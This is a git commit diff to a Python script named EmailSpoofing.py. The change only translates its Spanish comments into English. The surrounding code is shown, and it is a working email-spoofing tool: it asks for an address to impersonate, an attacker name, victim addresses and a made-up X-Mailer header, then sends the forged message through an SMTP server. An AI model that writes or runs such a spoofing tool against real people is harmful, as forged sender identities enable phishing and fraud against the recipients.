a38af7b27044b0456c7159dcead06f541b54b8d0
Alejandro Vera <55401513+xXaVeRaXx@users.noreply.github.com>
2022-06-22 20:24:14 +0200

    Update EmailSpoofing.py

--- EmailSpoofing.py
+++ EmailSpoofing.py
@@ -7,27 +7,27 @@ from email.message import Message
 def prompt(prompt):
     return input(prompt).strip()
 
-#Email a simular
+#Attacker's email
 email = input("Introduce un email que quiera simular: ")
 print()
 
-#Nombre de atacante
+#Attacker's name
 atacante = input("Introduce el nombre del atacante: ")
 print()
 
-#Víctima a atacar
+#Victim
 victima = prompt("Introduce una víctima a quién enviarle un email: ").split()
 print()
 
-#Tema
+#Subject
 subject = input("Introduce un asunto: ")
 print()
 
-#Texto
+#Message
 text = input("Introduce un texto: ")
 print()
 
-#Prioridad email
+#Email Priority
 print("Puedes escoger entre las siguientes prioridades:")
 print("1. Muy alta")
 print("2. Media alta")
@@ -37,19 +37,19 @@ print("5. Muy baja")
 prioridad = input("Introduce un número de la prioridad que desea que tenga el e-mail: ")
 print()
 
-#X-Mailer email
+#Email X-Mailer
 print("Puedes escoger diferentes X-Mailers, donde indicas de qué tipo de servidor proviene el email.")
 print("Ejemplos de X-Mailer: Apple Mail, ColdFusion MX Application Server, E-Messenger, iPhone Mail, KMail, Lotus Notes, Microsoft Office Outlook, Microsoft Outlook Express, Microsoft Outlook IMO, Microsoft Windows Live Mail, Microsoft Windows Mail, Mozilla Thunderbird, Mozilla/5.0, Novell GroupWise, Novell GroupWise Internet Agent, PHP, PHPMailer, QUALCOMM Windows Eudora Version, The Bat!, Unknown (No Version), YahooMailWebService y Zimbra")
 print("También puede inventarse uno a su elección, no necesariamente tiene que estar en la lista.")
 XMAILER = input("Introduce un X-Mailer que desea que tenga el e-mail: ")
 
-#Inicia el servidor para enviar el email
+#Start SMTP server
 server = smtplib.SMTP('localhost')
 server.set_debuglevel(1)
 server.ehlo()
 server.starttls()
 
-#Crea email con las indicaciones que le haya dado el usuario
+#Create email
 m = Message()
 m['From'] = "{}".format(atacante) + " <{}>".format(email)
 m['To'] = ', '.join(victima)
@@ -58,8 +58,8 @@ m['X-Mailer'] = XMAILER
 m['Subject'] = subject
 m.set_payload(text)
 
-#Envía el email
+#Send email
 server.sendmail(email, victima, m.as_string())
 
-#Cierra el servidor de correo
+#Close SMTP server
 server.quit()
